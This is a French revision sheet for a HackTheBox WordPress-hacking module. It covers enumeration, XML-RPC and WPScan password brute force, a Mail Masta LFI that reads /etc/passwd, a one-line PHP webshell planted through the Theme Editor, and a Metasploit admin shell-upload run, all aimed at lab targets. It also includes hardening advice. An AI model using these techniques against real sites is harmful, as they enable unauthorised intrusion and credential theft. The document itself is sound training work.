# 🎯 Fiche de révision HTB CJCA — Hacking WordPress

> **Légende**
> - 📘 Résumé du cours (traduit en français)
> - 🔑 À retenir absolument
> - ⌨️ Commandes / requêtes importantes
> - ✅ Question, réponse en français, et **Réponse à mettre sur HTB**
> - 🧭 Procédure détaillée, étape par étape, pour retrouver la réponse
> - ⚠️ Passage reconstitué (absent du cours) ou incohérence repérée

---

## Sommaire

1. [Page 1 — Intro](#page-1--intro)
2. [Page 2 — WordPress Structure](#page-2--wordpress-structure)
3. [Page 3 — WordPress User Roles](#page-3--wordpress-user-roles)
4. [Page 4 — WordPress Core Version Enumeration](#page-4--wordpress-core-version-enumeration)
5. [Page 5 — Plugins and Themes Enumeration](#page-5--plugins-and-themes-enumeration)
6. [Page 6 — Directory Indexing](#page-6--directory-indexing)
7. [Page 7 — User Enumeration](#page-7--user-enumeration)
8. [Page 8 — WPScan Overview](#page-8--wpscan-overview)
9. [Page 9 — Login](#page-9--login)
10. [Page 10 — WPScan Enumeration](#page-10--wpscan-enumeration)
11. [Page 11 — Exploiting a Vulnerable Plugin](#page-11--exploiting-a-vulnerable-plugin)
12. [Page 12 — Attacking WordPress Users](#page-12--attacking-wordpress-users)
13. [Page 13 — Remote Code Execution (RCE) via the Theme Editor](#page-13--remote-code-execution-rce-via-the-theme-editor)
14. [Page 14 — Attacking WordPress with Metasploit](#page-14--attacking-wordpress-with-metasploit)
15. [Page 15 — WordPress Hardening](#page-15--wordpress-hardening)
16. [Page 16 — Skills Assessment : WordPress](#page-16--skills-assessment--wordpress)
17. [Mémo final : toutes les réponses HTB](#mémo-final--toutes-les-réponses-htb)
18. [Cheat-sheet du module](#cheat-sheet-du-module)

---

# 🔌 Bloc de connexion à la cible (valable pour toutes les pages avec cible)

Chaque section « Questions » avec un bouton **Spawn Target** fournit une cible indépendante (nouvelle IP à chaque spawn). Deux façons de s'y connecter.

## Option A — Depuis le Pwnbox (le plus simple)

| Étape | Action |
|---|---|
| A1 | Clique sur **Spawn Target** et note l'**IP cible** (ex. `10.129.xx.xx`) |
| A2 | Clique sur **Linux Pwnbox** → **View Linux Pwnbox** |
| A3 | Ouvre un terminal et/ou Firefox dans le Pwnbox |
| A4 | Teste l'accès web : `curl -sI http://IP_CIBLE/ | head -n 1` (attendu : `HTTP/1.1 200 OK` ou `301/302`) |

## Option B — Depuis ta propre machine (VPN)

| Étape | Commande / action |
|---|---|
| B1 | Section du cours → bouton **OVPN** → **View VPN** → **Download VPN Connection File** |
| B2 | `sudo openvpn ~/Downloads/NOM_DU_FICHIER.ovpn` (laisser le terminal ouvert, attendre `Initialization Sequence Completed`) |
| B3 | Terminal 2 : `ip -4 addr show tun0` (attendu : IP `10.10.14.x`) |
| B4 | **Spawn Target**, note l'IP, puis : `ping -c 2 IP_CIBLE` et `curl -sI http://IP_CIBLE/ | head -n 1` |

## Note DNS (indiquée dans l'énoncé du Skills Assessment)
Certaines pages du site WordPress peuvent répondre différemment selon le **nom de domaine** utilisé (vhost Apache) plutôt que l'IP brute. Sans serveur DNS configuré, on simule la résolution de nom en ajoutant une ligne dans `/etc/hosts` :
```bash
echo "IP_CIBLE inlanefreight.com" | sudo tee -a /etc/hosts
```
Puis on navigue vers `http://inlanefreight.com` au lieu de `http://IP_CIBLE`.

---

# Page 1 — Intro

## 📘 Résumé

- **WordPress** est le CMS open source le plus utilisé au monde (~1/3 des sites). Écrit en **PHP**, tourne généralement sur **Apache** + **MySQL** (stack **LAMP**).
- Extensible via **thèmes** et **plugins** (gratuits ou payants), ce qui le rend très personnalisable mais aussi **exposé** aux vulnérabilités tierces.
- Un **CMS** (Content Management System) a 2 composants :

| Composant | Rôle |
|---|---|
| **CMA** (Content Management Application) | Interface pour ajouter/gérer le contenu |
| **CDA** (Content Delivery Application) | Backend qui assemble le code en site fonctionnel |

- Un bon CMS offre : extensibilité, gestion fine des utilisateurs/rôles, gestion des médias, contrôle de version, maintenance et sécurité à jour.

## 🔑 À retenir
- WordPress = PHP + Apache + MySQL (LAMP).
- CMS = CMA (édition) + CDA (rendu).

## ✅ Questions
Aucune question sur cette page.

---

# Page 2 — WordPress Structure

## 📘 Résumé

### Arborescence racine (`/var/www/html`)
```text
├── index.php            # page d'accueil
├── license.txt           # contient la version de WordPress
├── readme.html           # ancienne source d'info de version (vieilles installations)
├── wp-activate.php       # activation par e-mail (nouveaux sites)
├── wp-admin/             # backend, login admin
├── wp-config.php         # config (BDD, clés, salts)
├── wp-content/           # plugins, thèmes, uploads
├── wp-cron.php
├── wp-includes/          # cœur de WordPress (hors admin/thèmes)
├── wp-login.php
└── xmlrpc.php            # API XML-RPC (communication HTTP + XML)
```

### Fichiers clés
| Fichier / dossier | Rôle |
|---|---|
| `index.php` | Page d'accueil |
| `license.txt` | Version de WordPress installée |
| `wp-activate.php` | Activation par e-mail |
| `wp-admin/` | Login admin + dashboard. Chemins possibles : `/wp-admin/login.php`, `/wp-admin/wp-login.php`, `/login.php`, `/wp-login.php` (renommable) |
| `xmlrpc.php` | API XML-RPC, remplacée aujourd'hui par la **REST API** |
| `wp-config.php` | Connexion BDD (nom, hôte, user, password), clés et **salts** d'authentification, préfixe de table (`wp_`), mode `WP_DEBUG` |

### Dossiers clés
| Dossier | Contenu |
|---|---|
| `wp-content/` | **plugins/**, **themes/**, et souvent `uploads/` (fichiers déposés par les utilisateurs — à surveiller : RCE potentielle) |
| `wp-includes/` | Cœur hors admin/thèmes : certificats, polices, JS, widgets |

## 🔑 À retenir
- `wp-content/uploads/` = cible fréquente (upload de fichiers).
- `wp-config.php` contient les identifiants BDD + salts.
- `wp-login.php` peut être renommé pour durcir le site (voir page Hardening).

## ✅ Questions
Aucune question sur cette page.

---

# Page 3 — WordPress User Roles

## 📘 Résumé

| Rôle | Droits |
|---|---|
| **Administrator** | Accès complet : utilisateurs, articles, **édition du code source** (thèmes/plugins) |
| **Editor** | Publie et gère **tous** les articles, y compris ceux des autres |
| **Author** | Publie et gère **ses propres** articles |
| **Contributor** | Écrit et gère ses articles mais **ne peut pas les publier** |
| **Subscriber** | Utilisateur normal : lecture, édition de son profil |

🔑 L'**exécution de code** sur le serveur nécessite généralement un accès **Administrator** (Theme Editor, upload de plugin). Mais un **Editor**/**Author** peut parfois atteindre un plugin vulnérable inaccessible aux simples visiteurs.

## ✅ Questions
Aucune question sur cette page.

---

# Page 4 — WordPress Core Version Enumeration

## 📘 Résumé

Connaître la version exacte permet de chercher des CVE et des mauvaises configurations connues (mots de passe par défaut, etc.).

### Méthodes manuelles
| Méthode | Commande / action |
|---|---|
| Code source de la page | `[CTRL + U]` ou clic droit → *View Page Source*, chercher `<meta name="generator"` |
| Via cURL | `curl -s -X GET http://cible | grep '<meta name="generator"'` |
| Paramètres `?ver=` des CSS/JS | Repérer `?ver=5.3.3` dans les liens `<link>`/`<script>` |
| `readme.html` | Présent dans les **anciennes** installations, à la racine |

### ⌨️ Commandes
```bash
curl -s -X GET http://cible | grep '<meta name="generator"'
# <meta name="generator" content="WordPress 5.3.3" />
```

## 🔑 À retenir
- `generator` meta tag = source la plus fiable et la plus rapide.
- `?ver=X.Y.Z` sur les CSS/JS confirme souvent la version du cœur ou du thème/plugin.

## ✅ Questions
Aucune question sur cette page (question pratique traitée dans le Skills Assessment : « Identify the WordPress version number »).

---

# Page 5 — Plugins and Themes Enumeration

## 📘 Résumé

### Énumération passive (lecture du code source)
```bash
curl -s -X GET http://cible | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
curl -s -X GET http://cible | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```
→ liste les chemins de plugins/thèmes référencés dans le HTML (CSS/JS chargés par la page).

Les en-têtes HTTP de réponse peuvent aussi révéler des versions de plugins.

### Énumération active (requêtes directes)
```bash
curl -I -X GET http://cible/wp-content/plugins/mail-masta
# 301 Moved Permanently → le plugin existe

curl -I -X GET http://cible/wp-content/plugins/someplugin
# 404 Not Found → n'existe pas
```
Même logique pour les thèmes (`wp-content/themes/nom-du-theme`).

🔑 Automatiser avec un script bash, **wfuzz**, ou **WPScan** pour gagner du temps.

## 🔑 À retenir
- 301/redirection = ressource présente (accès indirect). 404 = absente.
- L'énumération passive (lecture du HTML) ne trouve pas tout : compléter par de l'actif.

## ✅ Questions
Aucune question sur cette page (traité dans le Skills Assessment : « Identify the WordPress theme in use »).

---

# Page 6 — Directory Indexing

## 📘 Résumé

- Un plugin **désactivé** reste souvent **accessible sur le disque** : le désactiver n'améliore pas la sécurité, il faut le **supprimer** ou le **mettre à jour**.
- Le **Directory Indexing** (listing de répertoire) expose l'arborescence d'un dossier quand aucun fichier d'index n'est présent et que l'option n'est pas désactivée côté serveur (Apache `Options -Indexes`).

### ⌨️ Visualiser un listing proprement
```bash
curl -s -X GET http://cible/wp-content/plugins/mail-masta/ | html2text
```
Sortie typique : liste des sous-dossiers (`amazon_api/`, `inc/`, `lib/`) et fichiers (`plugin-interface.php`, `readme.txt`) avec tailles et dates.

## 🔑 À retenir
- Un plugin désactivé ≠ un plugin sécurisé.
- Le directory listing permet de naviguer et de trouver des fichiers sensibles (voir Skills Assessment : flag dans un dossier en listing ouvert).
- Durcissement : désactiver l'indexation (`Options -Indexes` dans Apache).

## ✅ Questions
Aucune question sur cette page (traité dans le Skills Assessment).

---

# Page 7 — User Enumeration

## 📘 Résumé

Objectif : obtenir une liste d'utilisateurs valides pour ensuite tenter un brute force / credential stuffing.

### Méthode 1 — Paramètre `?author=`
```bash
curl -s -I http://cible/?author=1
# 301 + Location: http://cible/index.php/author/admin/  → l'utilisateur 1 (souvent "admin") existe

curl -s -I http://cible/?author=100
# 404 Not Found → id inexistant
```
🔑 L'ID **1** correspond presque toujours au tout premier compte créé (souvent `admin`). On incrémente l'ID pour découvrir d'autres comptes.

### Méthode 2 — Endpoint JSON (REST API)
```bash
curl http://cible/wp-json/wp/v2/users | jq
```
Retourne un tableau JSON avec `id`, `name` (login affiché), `link` pour chaque utilisateur **publié** (ayant un article).

> ⚠️ Depuis **WordPress > 4.7.1**, cet endpoint ne montre que les comptes qui ont publié du contenu, contrairement aux versions antérieures qui exposaient tous les utilisateurs enregistrés.

## 🔑 À retenir
- `?author=N` : 301 = existe, 404 = n'existe pas.
- `/wp-json/wp/v2/users` : liste JSON directe (si accessible).

## ✅ Question — User ID 2

| | |
|---|---|
| **Question (EN)** | From the last cURL command, what user name is assigned to User ID 2? |
| **Question (FR)** | D'après la dernière commande cURL (`wp-json/wp/v2/users`), quel nom d'utilisateur correspond à l'ID 2 ? |
| **Réponse (FR)** | `ch4p` (exemple du cours) |
| **Réponse à mettre sur HTB** | *(à compléter avec ta propre cible)* |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target**, note `IP_CIBLE`.
2. Pwnbox ou VPN (voir Bloc de connexion en haut de la fiche).
3. Teste : `curl -sI http://IP_CIBLE/ | head -n 1`.

**Partie 1 : la recherche**
4. Lance :
   ```bash
   curl http://IP_CIBLE/wp-json/wp/v2/users | jq
   ```
5. Si `jq` n'est pas installé : `sudo apt install jq -y`, ou lis le JSON brut sans mise en forme.
6. Repère l'objet où `"id": 2` et lis la valeur du champ `"name"`.

✔️ **Plan B** si l'endpoint ne retourne rien (API désactivée ou aucun utilisateur n'a publié) :
```bash
curl -s -I http://IP_CIBLE/?author=2
```
Lis l'URL après `Location:` : le dernier segment avant le `/` final est le nom d'utilisateur.

**Partie 2 : validation**
7. Saisis le nom lu (`name`) exactement tel quel → **Submit**.

---

# Page 8 — WPScan Overview

## 📘 Résumé

**WPScan** est un scanner WordPress automatisé, préinstallé sur Parrot OS (sinon : `gem install wpscan`).

```bash
wpscan --hh   # aide complète, toutes les options
```

- Permet d'énumérer plugins, thèmes, utilisateurs, sauvegardes de config, médias.
- Utilise une base de données de vulnérabilités (ex. **WPVulnDB**) via un **`--api-token`** (plan gratuit : 50 requêtes/jour). Créer un compte, copier le token depuis la page profil.

### ⌨️ Options utiles
| Option | Rôle |
|---|---|
| `--url <url>` | Cible à scanner (obligatoire) |
| `-v` / `--verbose` | Mode verbeux |
| `-o FILE` | Sortie vers un fichier |
| `-f FORMAT` | Format de sortie (`cli`, `json`, …) |
| `--api-token <token>` | Active les recherches de vulnérabilités |

## 🔑 À retenir
- `wpscan --hh` = aide complète.
- Un token API (gratuit) améliore fortement la détection de vulnérabilités.

## ✅ Questions
Aucune question sur cette page (exercice d'exploration de l'aide, pas de soumission).

---

# Page 9 — Login

## 📘 Résumé

Une fois des identifiants (ou une liste d'utilisateurs) en main, on peut tenter un **brute force** sur :
- la page de login classique (`wp-login.php`), **ou**
- l'API **`xmlrpc.php`** (plus rapide, une seule requête POST peut tester un couple login/mot de passe).

### Requête XML-RPC — `wp.getUsersBlogs`
**Identifiants valides** → réponse `methodResponse` avec les infos du blog (`isAdmin`, `url`, `blogName`, etc.) :
```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://cible/xmlrpc.php
```

**Identifiants invalides** → `faultCode` **403**, `faultString: "Incorrect username or password."`
```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://cible/xmlrpc.php
```

## 🔑 À retenir
- `xmlrpc.php` permet de **brute forcer login ET de tester plusieurs méthodes en un seul appel** (`system.multicall`), ce qui le rend redoutable pour accélérer les attaques (et dangereux côté défense : à désactiver/restreindre si inutile).
- Code **403 + faultCode** = échec, pas d'erreur HTTP classique.

## ✅ Question — Nombre de méthodes XML-RPC possibles

| | |
|---|---|
| **Question (EN)** | Search for "WordPress xmlrpc attacks" and find out how to use it to execute all method calls. Enter the number of possible method calls of your target as the answer. |
| **Question (FR)** | Cherche « WordPress xmlrpc attacks » pour savoir comment lister tous les appels de méthode possibles. Donne le nombre d'appels de méthode possibles sur ta cible. |
| **Réponse (FR)** | Nombre obtenu via la méthode `system.listMethods` |
| **Réponse à mettre sur HTB** | *(à compléter avec le résultat sur ta cible)* |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox ou VPN, teste `curl -sI http://IP_CIBLE/xmlrpc.php | head -n 1` (attendu : `405 Not Allowed` en GET, normal — xmlrpc n'accepte que POST).

**Partie 1 : la recherche** (méthode XML-RPC `system.listMethods`, qui liste **toutes** les méthodes disponibles sur l'API)
3. Envoie la requête :
   ```bash
   curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://IP_CIBLE/xmlrpc.php
   ```
4. La réponse est un XML contenant un tableau (`<array><data>...`) où chaque `<value><string>nom.methode</string></value>` est une méthode disponible.
5. Compte le nombre d'éléments `<string>` dans la réponse. Astuce rapide avec `grep -o` :
   ```bash
   curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://IP_CIBLE/xmlrpc.php | grep -o '<string>' | wc -l
   ```
6. Le nombre affiché est la réponse à soumettre.

✔️ **Résultat attendu** : un nombre entier (généralement entre 40 et 60 selon la version et les plugins installés).

✔️ **Plan B** si `xmlrpc.php` renvoie une erreur ou est désactivé : vérifier avec WPScan (`wpscan --url http://IP_CIBLE --enumerate` repère si XML-RPC est activé) ; sinon la fonctionnalité est simplement désactivée sur cette cible et la question ne s'applique pas.

**Partie 2 : validation**
7. Saisis le nombre obtenu → **Submit**.

---

# Page 10 — WPScan Enumeration

## 📘 Résumé

```bash
wpscan --url http://cible --enumerate --api-token TON_TOKEN
```

`--enumerate` (alias `-e`) cible des composants précis :
| Code | Composant |
|---|---|
| `ap` | All Plugins |
| `vp` | Vulnerable Plugins (par défaut) |
| `at` | All Themes |
| `vt` | Vulnerable Themes |
| `u` | Users |
| `cb` | Config Backups |
| `m` | Media |

Par défaut, WPScan énumère : plugins vulnérables, thèmes, utilisateurs, médias, sauvegardes.

### Exemple de sortie (cours)
- En-têtes serveur (`Apache/2.4.38`, `PHP/7.3.15`)
- **XML-RPC activé**
- **WP-Cron externe activé**
- Version WordPress identifiée via le flux RSS (`?feed=rss2`)
- Thème en service (`twentytwenty`), avec version obsolète signalée
- Plugins identifiés avec vulnérabilités connues et liens vers les PoC (exploit-db, wpvulndb)
- Utilisateurs identifiés par détection passive (auteur d'articles) et active (brute force d'ID d'auteur, messages d'erreur de login)

## 🔑 À retenir
- `-t` règle le nombre de threads (défaut : 5).
- Les vulnérabilités d'un plugin recensé pointent vers des PoC exploitables directement.

## ✅ Question — Version du plugin "photo-gallery"

| | |
|---|---|
| **Question (EN)** | Enumerate the provided WordPress instance for all installed plugins. Perform a scan with WPScan against the target and submit the version of the vulnerable plugin named "photo-gallery". |
| **Question (FR)** | Énumère tous les plugins installés sur la cible. Scanne avec WPScan et donne la version du plugin vulnérable nommé « photo-gallery ». |
| **Réponse (FR)** | Version détectée par WPScan |
| **Réponse à mettre sur HTB** | *(à compléter avec le résultat sur ta cible)* |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox ou VPN (voir Bloc de connexion).
3. Teste : `curl -sI http://IP_CIBLE/ | head -n 1`.

**Partie 1 : la recherche**
4. Lance un scan complet des plugins (pas seulement les vulnérables) :
   ```bash
   wpscan --url http://IP_CIBLE --enumerate ap
   ```
5. Dans la sortie, repère le bloc commençant par `[+] photo-gallery`.
6. Lis la ligne `Version: X.Y.Z` juste en dessous (parfois annotée `Confirmed By` avec la méthode de détection — readme, changelog, en-tête du fichier CSS/JS principal du plugin).

✔️ **Résultat attendu** : un numéro de version du type `1.5.33` (exemple indicatif).

✔️ **Plan B** si la version n'apparaît pas avec `-e ap` :
```bash
curl -s http://IP_CIBLE/wp-content/plugins/photo-gallery/readme.txt | grep -i "stable tag"
```
ou directement : `curl -s http://IP_CIBLE/wp-content/plugins/photo-gallery/readme.txt | head -n 20`.

**Partie 2 : validation**
7. Saisis la version exacte (`X.Y.Z`) → **Submit**.

---

# Page 11 — Exploiting a Vulnerable Plugin

## 📘 Résumé

### Cas d'étude : Mail Masta 1.0 — LFI non authentifiée
PoC (exploit-db #40290) : lire n'importe quel fichier local via :
```text
/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

```bash
curl http://cible/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
→ retourne le contenu de `/etc/passwd` (liste des comptes système, shells, home directories).

🔑 Le même plugin est aussi listé comme vulnérable à des **injections SQL multiples**.

### Lire `/etc/passwd` pour trouver des comptes utilisateurs
Un compte avec un **shell de login valide** (`/bin/bash`, `/bin/sh`) — par opposition à `/usr/sbin/nologin` ou `/bin/false` — est un compte **utilisable** pour une connexion SSH ou un mouvement latéral.

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## 🔑 À retenir
- Paramètre `pl=` = chemin de fichier arbitraire (LFI classique par paramètre GET).
- Dans `/etc/passwd`, filtrer les lignes qui finissent par un vrai shell (`/bin/bash`, `/bin/sh`, `/bin/zsh`) pour trouver les comptes exploitables.

## ✅ Question — Utilisateur non-root avec un shell de login

| | |
|---|---|
| **Question (EN)** | Use the same LFI vulnerability against your target and read the contents of the "/etc/passwd" file. Locate the only non-root user on the system with a login shell. |
| **Question (FR)** | Utilise la même LFI sur ta cible et lis `/etc/passwd`. Trouve le seul utilisateur non-root avec un shell de login. |
| **Réponse (FR)** | Nom du compte repéré dans la sortie |
| **Réponse à mettre sur HTB** | *(à compléter avec le résultat sur ta cible)* |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox ou VPN.
3. Confirme la présence du plugin : `curl -sI http://IP_CIBLE/wp-content/plugins/mail-masta/ | head -n 1` (attendu : `200` ou `301`).

**Partie 1 : la recherche**
4. Exploite la LFI :
   ```bash
   curl http://IP_CIBLE/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
   ```
5. Lis chaque ligne, format : `login:x:UID:GID:commentaire:home:shell`.
6. Élimine toutes les lignes se terminant par `/usr/sbin/nologin`, `/bin/false`, ou similaire.
7. Élimine `root` (`UID 0`) puisque la question demande le seul utilisateur **non-root**.
8. Il doit rester une seule ligne avec un vrai shell (`/bin/bash` ou `/bin/sh`) : c'est la réponse (le `login`, premier champ).

✔️ **Plan B** si le plugin n'est pas à ce chemin exact (version différente) : vérifier le chemin avec `wpscan --url http://IP_CIBLE --enumerate vp` qui donne le lien du PoC exact pour la version détectée.

**Partie 2 : validation**
9. Saisis le `login` trouvé → **Submit**.

---

# Page 12 — Attacking WordPress Users

## 📘 Résumé

**WPScan** peut brute forcer logins et mots de passe.

| Méthode | Principe | Vitesse |
|---|---|---|
| `xmlrpc` | Utilise l'API `/xmlrpc.php` (`wp.getUsersBlogs`) | **Rapide** (préférée) |
| `wp-login` | Brute force la page de login classique | Plus lent |

```bash
wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://cible
```
- `-U` : liste des logins (séparés par virgules) ou fichier.
- `-P` : wordlist de mots de passe.
- `-t` : nombre de threads.

Sortie attendue en cas de succès : `[SUCCESS] - login / mot_de_passe`.

## 🔑 À retenir
- `--password-attack xmlrpc` > `wp-login` en vitesse.
- `-t 20` accélère mais augmente le bruit/risque de lockout si une protection anti-brute-force est active.

## ✅ Question — Mot de passe de "roger"

| | |
|---|---|
| **Question (EN)** | Perform a bruteforce attack against the user "roger" on your target with the wordlist "rockyou.txt". Submit the user's password as the answer. |
| **Question (FR)** | Fais un brute force sur l'utilisateur « roger » avec la wordlist `rockyou.txt`. Donne son mot de passe. |
| **Réponse (FR)** | Mot de passe trouvé par WPScan |
| **Réponse à mettre sur HTB** | *(à compléter avec le résultat sur ta cible)* |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox (rockyou.txt déjà présent, généralement dans `/usr/share/wordlists/rockyou.txt`, parfois à décompresser : `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`) ou VPN + ta propre copie de la wordlist.
3. Teste : `curl -sI http://IP_CIBLE/ | head -n 1`.

**Partie 1 : le brute force**
4. Vérifie que `xmlrpc.php` est actif :
   ```bash
   curl -sI http://IP_CIBLE/xmlrpc.php | head -n 1
   ```
5. Lance l'attaque :
   ```bash
   wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://IP_CIBLE
   ```
6. Patiente (cela peut prendre du temps selon la position du mot de passe dans la wordlist et le nombre de threads).
7. Repère la ligne `[SUCCESS] - roger / <mot_de_passe>`.

✔️ **Plan B** si `xmlrpc` échoue ou est désactivé (bloqué par un WAF/plugin de sécurité) :
```bash
wpscan --password-attack wp-login -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://IP_CIBLE
```

**Partie 2 : validation**
8. Saisis le mot de passe exact trouvé → **Submit**.

---

# Page 13 — Remote Code Execution (RCE) via the Theme Editor

## 📘 Résumé

Avec un accès **Administrator**, on peut éditer directement le code PHP via **Appearance → Theme Editor**.

### Étapes
1. Se connecter en admin.
2. **Appearance** → **Theme Editor**.
3. **Choisir un thème inactif** (ne jamais modifier le thème actif en production — ici éviter de le corrompre).
4. Modifier un fichier non critique (ex. `404.php`) et insérer :
   ```php
   <?php
   system($_GET['cmd']);
   ```
5. Appeler la page modifiée avec le paramètre `cmd` :
   ```bash
   curl -X GET "http://cible/wp-content/themes/twentyseventeen/404.php?cmd=id"
   # uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
   ```

## 🔑 À retenir
- Theme Editor = exécution de code arbitraire pour un compte **Administrator**.
- Toujours choisir un thème **inactif** pour ne pas casser le site en production (en pentest réel ; en lab, peu d'impact).
- `system($_GET['cmd'])` = webshell minimal en une ligne.

## ✅ Question — Flag dans le home de wp-user

| | |
|---|---|
| **Question (EN)** | Use the credentials for the admin user [admin:sunshine1] and upload a webshell to your target. Once you have access to the target, obtain the contents of the "flag.txt" file in the home directory for the "wp-user" directory. |
| **Question (FR)** | Utilise les identifiants `admin:sunshine1`, dépose un webshell sur la cible, puis lis `flag.txt` dans le répertoire personnel de `wp-user`. |
| **Réponse (FR)** | Contenu du flag |
| **Réponse à mettre sur HTB** | *(à compléter avec le résultat sur ta cible)* |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox ou VPN.
3. Ouvre `http://IP_CIBLE/wp-login.php` dans le navigateur (ou via Pwnbox).
4. Connecte-toi avec `admin` / `sunshine1`.

**Partie 1 : dépôt du webshell via le Theme Editor**
5. Menu latéral → **Appearance** → **Theme Editor**.
6. En haut à droite, sélectionne un thème **inactif** dans le menu déroulant (ex. *Twenty Seventeen* si le thème actif est différent) → **Select**.
7. Dans la liste des fichiers à droite, clique sur **404 Template** (`404.php`).
8. Tout en haut du fichier, juste après `<?php`, insère :
   ```php
   system($_GET['cmd']);
   ```
9. Clique sur **Update File** (en bas de l'éditeur).

**Partie 2 : exécution de commandes**
10. Teste l'exécution :
    ```bash
    curl "http://IP_CIBLE/wp-content/themes/NOM_DU_THEME/404.php?cmd=id"
    ```
    (remplace `NOM_DU_THEME` par le nom technique exact du thème, ex. `twentyseventeen`, visible dans l'URL de l'éditeur ou dans `wp-content/themes/`).
11. Lis le contenu du flag directement :
    ```bash
    curl "http://IP_CIBLE/wp-content/themes/NOM_DU_THEME/404.php?cmd=cat+/home/wp-user/flag.txt"
    ```
    (l'espace dans la commande shell doit être encodé en `+` ou `%20` dans l'URL).

✔️ **Plan B** si `cat` ne fonctionne pas via `system()` à cause de l'encodage d'URL : utilise `curl -G --data-urlencode "cmd=cat /home/wp-user/flag.txt" "http://IP_CIBLE/wp-content/themes/NOM_DU_THEME/404.php"`.

**Partie 3 : validation**
12. Copie le contenu exact du flag (format `HTB{...}`) → **Submit**.

---

# Page 14 — Attacking WordPress with Metasploit

## 📘 Résumé

**Metasploit** peut automatiser l'obtention d'un reverse shell, mais nécessite des **identifiants valides** avec assez de droits pour créer des fichiers (upload de plugin).

### ⌨️ Déroulé
```bash
msfconsole
search wp_admin
# 0  exploit/unix/webapp/wp_admin_shell_upload

use 0
options
# PASSWORD, USERNAME, RHOSTS, RPORT, SSL, TARGETURI requis

set rhosts blog.cible.com
set username admin
set password sunshine1
set lhost IP_ATTAQUANT
run
```
→ Metasploit s'authentifie, uploade un plugin malveillant contenant le payload, exécute le payload, ouvre une session **Meterpreter**, puis **supprime** automatiquement le fichier déposé (nettoyage).

```text
meterpreter > getuid
Server username: www-data (33)
```

## 🔑 À retenir
- Module : `exploit/unix/webapp/wp_admin_shell_upload`.
- Nécessite des identifiants admin **valides**.
- Le shell obtenu tourne sous l'utilisateur du serveur web (souvent `www-data`), pas un compte à privilèges élevés.

## ✅ Questions
Aucune question sur cette page (démonstration, intégrée à la pratique du Skills Assessment).

---

# Page 15 — WordPress Hardening

## 📘 Résumé

### Mises à jour
Garder à jour : cœur WordPress, plugins, thèmes. Activer les mises à jour automatiques via `wp-config.php` :
```php
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```

### Gestion des plugins/thèmes
- N'installer que depuis **wordpress.org**, vérifier avis, popularité, date de dernière mise à jour.
- Supprimer les thèmes/plugins **inutilisés** (même désactivés, ils restent potentiellement accessibles — voir page Directory Indexing).

### Plugins de sécurité
| Plugin | Fonctions |
|---|---|
| **Sucuri Security** | Audit d'activité, intégrité des fichiers, scan de malware, surveillance de blacklist |
| **iThemes Security** | 2FA, salts/clés WordPress, Google reCAPTCHA, logs d'action utilisateur |
| **Wordfence Security** | WAF endpoint, scanner de malware, mises à jour temps réel (premium), blacklist d'IP (premium) |

### Gestion des utilisateurs
- Désactiver/renommer le compte `admin` par défaut.
- Mots de passe forts + **2FA** obligatoire.
- Principe du **moindre privilège**.
- Audit périodique des comptes et des droits.

### Gestion de la configuration
- Plugin anti-énumération d'utilisateurs.
- Limiter les tentatives de connexion (anti brute-force).
- Renommer/déplacer `wp-login.php`, le restreindre à certaines IP.

## 🔑 À retenir
- Désactiver un plugin ne suffit pas : il faut le **supprimer**.
- `wp-config.php` peut forcer les mises à jour automatiques.
- Hardening = mises à jour + gestion plugins + WAF + 2FA + limitation de login.

## ✅ Questions
Aucune question sur cette page.

---

# Page 16 — Skills Assessment : WordPress

## 📘 Résumé

### Scénario
Pentest externe pour **INLANEFREIGHT**, site public sous WordPress. Objectif : énumération complète (plusieurs flags) puis obtention d'un accès shell au serveur web (flag final).

> ⚠️ **Note du cours** : il faut savoir comment WordPress gère la résolution de nom en Linux **quand aucun serveur de noms n'est configuré** → ajouter une entrée dans `/etc/hosts` pour mapper l'IP cible à un nom d'hôte (voir Bloc de connexion en haut de la fiche), car certaines ressources du site ne sont servies correctement que via le bon **vhost** (nom de domaine), pas via l'IP brute.

## ✅ Questions du Skills Assessment

### ❓ 1 — Version de WordPress

| | |
|---|---|
| **Réponse à mettre sur HTB** | `5.1.6` |

**🧭 Procédure**
1. **Spawn Target**, connecte-toi (Pwnbox/VPN), configure `/etc/hosts` si besoin.
2. `curl -s http://IP_CIBLE | grep '<meta name="generator"'` (page 4).
3. Si vide : scan `wpscan --url http://IP_CIBLE` (détection via flux RSS `?feed=rss2` ou en-têtes).

---

### ❓ 2 — Thème WordPress utilisé

| | |
|---|---|
